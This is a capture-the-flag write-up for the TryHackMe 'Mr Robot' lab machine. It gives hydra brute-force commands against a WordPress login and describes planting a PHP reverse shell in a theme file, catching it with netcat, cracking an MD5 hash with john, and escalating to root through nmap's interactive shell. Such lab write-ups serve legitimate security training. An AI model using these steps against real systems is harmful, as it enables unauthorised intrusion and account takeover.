```          
 __       __                _______             __                   __           ______  ________  ________ 
|  \     /  \              |       \           |  \                 |  \         /      \|        \|        \
| $$\   /  $$  ______      | $$$$$$$\  ______  | $$____    ______  _| $$_       |  $$$$$$\\$$$$$$$$| $$$$$$$$
| $$$\ /  $$$ /      \     | $$__| $$ /      \ | $$    \  /      \|   $$ \      | $$   \$$  | $$   | $$__    
| $$$$\  $$$$|  $$$$$$\    | $$    $$|  $$$$$$\| $$$$$$$\|  $$$$$$\\$$$$$$      | $$        | $$   | $$  \   
| $$\$$ $$ $$| $$   \$$    | $$$$$$$\| $$  | $$| $$  | $$| $$  | $$ | $$ __     | $$   __   | $$   | $$$$$   
| $$ \$$$| $$| $$          | $$  | $$| $$__/ $$| $$__/ $$| $$__/ $$ | $$|  \    | $$__/  \  | $$   | $$      
| $$  \$ | $$| $$          | $$  | $$ \$$    $$| $$    $$ \$$    $$  \$$  $$     \$$    $$  | $$   | $$      
 \$$      \$$ \$$           \$$   \$$  \$$$$$$  \$$$$$$$   \$$$$$$    \$$$$       \$$$$$$    \$$    \$$                                                                                                                   
```
Can you root this Mr. Robot styled machine? This is a lab machine meant for beginners and
intermediate users. There are three hidden keys located on the machine, can you find them
all? [^1]

What is key 1?
-----------------------------------------------------------------------------------------
Upon accessing the website at the IP address, we are prompted with a CLI that offers us
various easter eggs and references about the show. However, none of them bring us any
closer and we have a look at the hint *robots*. It is thus clear to us, to visit the
`/robots.txt` on the target site. Here, we can find the two listings `fsocity.dic` and
`key-1-of-3.txt` which search crawlers should not find or list in their results because
they are containing potentially sensitive information. And indeed, the first contains a
dictionary wordlist whereas the second file contains the first key.

What is key 2?
-----------------------------------------------------------------------------------------
For the second task, we want to use the wordlist in a dictionary brute-force password
attack against the login page, which we found in a previous directory enumeration.

```
gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q
```
Besides, the `/wp-login`, we also discovered `/intro`, `/robots`, `/readme`, `/sitemap`,
`/licence` and more redirects. Upon discovering the Wordpress `/wp-login` site, we
immediately want to find out what version it is running on for vulnerability search.
But first, we want to capture a sample login request with Burp Suite or similar intecept
tools, to find out that the credentials are requested in the `log=admin&pwd=1234` format.
After having sorted the wordlist, we find out that there are many duplicates which we
can remove with `cat fsocity.dic | sort | uniq -d > fsocity_no_duplicates.dic` for a
faster brute-force attack. Now, we want to attempt to brute force this login form with
the shortened dictionary.

```
$ hydra -L fsocity_no_duplicates.dic -p test <TARGET_IP_ADDRESS> http-post-form "/wp-login.php
    :log=^USER^&pwd=^PASS^:Invalid username" -t 30
# [80][http-post-form] login: Elliot (found a valid username)
```
This way, we were able to find the username "elliot" in various capital spellings and we
can proceed to the password.

```
$ hydra -l elliot -P fsocity_no_duplicates.dic <TARGET_IP_ADDRESS> http-post-form
    "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30 -I
```
Therefore, we obtain the password which turns out to be Elliot's social security number.
Finally, we can login to the wordpress site with the username *elliot* and the found 
password. There, we are greeted with the version *4.3.1* of WordPress and we are able to
use the Editor. But, we want to modify the "Twenty Fifteen" theme of this WordPress site,
especially the `archive.php` file. For this, we rely on the common PentestMonkey's [^2]
reverse PHP shell script to copy it's content to the archive file. Note, that we need to
change the port and attacking box IP address. We then open a new listener on our
attacking box with `nc -lvnp 1234` and open the `archive.php` PHP script on the target
machine `http://<TARGET_IP_ADDRESS>/wp-content/themes/twentyfifteen/archive.php`. Now,
we get a reverse shell and can already discover the second key. In order to read its
contents, we need to brute-force the MD5-encoded password of the *robot* user, which
can be done with `john` and the dictionary file.

```
[remote shell] $ ls
key-2-of-3.txt
password.raw-md5

[attacking box] $ cat md5_hash
robot:c3fcd3d76192e4007dfb496cca67e13b

[attacking box] $ john md5_hash --wordlist=fsocity.dic --format=Raw-MD5
```
This now returns the correct password "abcdefghijklmnopqrstuvwxyz" only in capitals and
we are able to upgrade our shell to the *robot* user with the following code
`python -c 'import pty;pty.spawn("/bin/bash")'; su robot`.

What is key 3?
-----------------------------------------------------------------------------------------
The hint for key three tells us to perform network enumeration on the target site, and
with `nmap -sV -sC <TARGET_IP_ADDRESS>` we are able to find out that there is a webserver
running on this machine on the open ports *80* and *443*.
Instead of running `nmap` on our attacking box, we aim at running it on the reverse shell
to elevate our privileges in the hopes of getting root. And indeed, with the command
`nmap --interactive` we can obtain the third key as follows.

```
nmap> !sh
# whoami
root
nmap> cat /root/key-3-of-3.txt
```

[^1]: https://tryhackme.com/room/mrrobot
[^2]: https://github.com/pentestmonkey/php-reverse-shell
